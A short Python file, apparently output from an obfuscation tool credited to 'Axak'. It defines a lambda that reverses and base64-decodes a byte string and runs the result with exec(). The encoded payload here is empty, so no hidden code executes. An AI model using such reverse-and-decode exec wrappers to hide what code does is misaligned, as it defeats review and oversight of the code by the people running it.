# Obfuscated By Axak 
# https://www.github.com/PaNdAxAk 
# Time : Fri Jul  1 14:13:23 2022 

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))